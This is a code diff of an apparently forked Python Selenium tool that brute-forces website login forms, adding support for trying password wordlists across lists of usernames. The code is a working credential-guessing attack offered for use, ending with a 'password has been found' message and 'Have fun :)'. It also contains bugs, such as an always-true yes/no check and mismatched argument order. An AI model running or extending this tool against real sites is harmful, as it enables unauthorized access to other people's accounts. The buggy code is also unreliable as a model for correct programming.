@@ -1,11 +1,12 @@
-# Coded by METACHAR
-# Looking to work with other hit me up on my email @metachar1@gmail.com <--
 """
+Original code by METACHAR & FlorianBord2
+
 Author: dark-anub1s
 Date: 4-19-2021
-Features:
-    Added multi-user processing
+Added Features:
+    Multi-User Support
 """
+
 # Imports
 import sys
 import datetime
@@ -79,69 +80,68 @@ def wizard():
     username_selector = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter the username selector: ')
     password_selector = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter the password selector: ')
     login_btn_selector = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter the Login button selector: ')
-    username = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter the username to brute-force: ')
     pass_list = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter a directory to a password list: ')
-    user_list = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter a directory to a user list: ')
-    brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
+    response = input(Color.GREEN + '[~]' + Color.WHITE + 'Do you want to use a username list [y/n]: ')
+    if response.lower() == 'y' or 'yes':
+        user_list = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter a list of usernames to brute-force: ')
+        use_list = True
+        brutes(user_list, username_selector, password_selector, login_btn_selector, pass_list, website, use_list)
+    elif response.lower() == 'n' or 'no':
+        username = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter the username to brute-force: ')
+        use_list = False
+        brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website, use_list)
+    else:
+        wizard()
 
 
-def brutes_ulist(userlist, passlist, username_selector, password_selector, login_btn_selector, website):
-    with open(passlist, 'r') as f:
-        p_list = f.readlines()
-    with open(userlist, 'r') as file:
-        u_list = file.readlines()
+def brutes(username, passlist, username_selector, password_selector, login_btn_selector, website, use_list):
+    count = 0
+    with open(passlist, 'r') as file:
+        f = file.readlines()
+    if use_list:
+        with open(username, 'r') as file2:
+            users = file2.readlines()
+    else:
+        users = username
+        print(len(users))
     optionss = webdriver.ChromeOptions()
     optionss.add_argument("--disable-popup-blocking")
     optionss.add_argument("--disable-extensions")
     browser = webdriver.Chrome(chrome_options=optionss)
     wait = WebDriverWait(browser, 10)
-    count = 0
-    while count < len(u_list):
+    while count < len(users):
         try:
-            for user in u_list:
-                for line in p_list:
+            if use_list:
+                with open(username, 'r') as file2:
+                    users = file2.readlines()
+                    for user in users:
+                        for line in f:
+                            browser.get(website)
+                            wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
+                            Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
+                            Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
+                            enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
+                            Sel_user.send_keys(user)
+                            Sel_pas.send_keys(line)
+                            print ('------------------------')
+                            print (Color.GREEN + 'Tried password: '+Color.RED + line + Color.GREEN + 'for user: '+Color.RED+ username)
+                            print ('------------------------')
+                            count += 1
+            else:
+                for line in f:
+                    print(f'The Current user is: {users}')
+                    print(f'The currnet password is: {line}')
                     browser.get(website)
                     wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
                     Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
                     Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                     enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
-                    Sel_user.send_keys(user)
+                    Sel_user.send_keys(users)
                     Sel_pas.send_keys(line)
                     print ('------------------------')
                     print (Color.GREEN + 'Tried password: '+Color.RED + line + Color.GREEN + 'for user: '+Color.RED+ username)
                     print ('------------------------')
-                    count += 1
-        except KeyboardInterrupt: #returns to main menu if ctrl C is used
-            print('CTRL C')
-            break
-        except selenium.common.exceptions.NoSuchElementException:
-            print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
-            print ('LAST PASS ATTEMPT BELLOW')
-            print (Color.GREEN + 'Password has been found: {0}'.format(line))
-            print (Color.YELLOW + 'Have fun :)')
-            exit()
-
-
-def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
-    f = open(pass_list, 'r')
-    optionss = webdriver.ChromeOptions()
-    optionss.add_argument("--disable-popup-blocking")
-    optionss.add_argument("--disable-extensions")
-    browser = webdriver.Chrome(chrome_options=optionss)
-    wait = WebDriverWait(browser, 10)
-    while True:
-        try:
-            for line in f:
-                browser.get(website)
-                wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
-                Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
-                Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
-                enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
-                Sel_user.send_keys(username)
-                Sel_pas.send_keys(line)
-                print ('------------------------')
-                print (Color.GREEN + 'Tried password: '+Color.RED + line + Color.GREEN + 'for user: '+Color.RED+ username)
-                print ('------------------------')
+                count = len(users)
         except KeyboardInterrupt: #returns to main menu if ctrl C is used
             print('CTRL C')
             break
@@ -163,7 +163,8 @@ banner = Color.BOLD + Color.RED +'''
   {4}[{5}-{6}]--> {7}coded by Metachar
   {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(Color.RED, Color.WHITE,Color.RED,Color.GREEN,Color.RED, Color.WHITE,Color.RED,Color.GREEN,Color.RED, Color.WHITE,Color.RED,Color.GREEN)
 
-if not options.username or not options.passlist or not options.userlist:
+if not options.username or not options.usernamesel or not options.passsel or not options.loginsel \
+        or not options.website or not options.passlist or not options.userlist:
     wizard()
 
 
@@ -174,10 +175,11 @@ login_btn_selector = options.loginsel
 website = options.website
 pass_list = options.passlist
 user_list = options.userlist
-print (banner)
+print(f'User list {user_list} / Password list {pass_list}')
+# print(banner)
 
 if user_list:
-    brutes_ulist(user_list, pass_list, username_selector, password_selector, login_btn_selector, website)
+    brutes(user_list, pass_list, username_selector, password_selector, login_btn_selector, website, use_list=True)
 else:
-    brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website)
+    brutes(username, pass_list, username_selector, password_selector, login_btn_selector, website, use_list=False)
 
